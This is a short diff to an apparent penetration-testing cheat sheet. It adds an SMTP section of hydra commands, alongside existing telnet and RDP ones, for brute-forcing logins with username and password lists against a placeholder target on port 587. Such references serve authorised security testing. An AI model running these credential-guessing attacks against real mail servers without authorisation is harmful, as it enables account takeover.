@@ -35,3 +35,9 @@ hydra -l <username> -P <password list> <target> telnet
 ```
 hydra -l <username> -P <password list> <target> rdp
 ```
+
+#### SMTP
+```
+hydra -l user@target.com -P passwords.txt smtp://target.com:587
+hydra -L users.txt -P passwords.txt smtp://target.com:587
+```
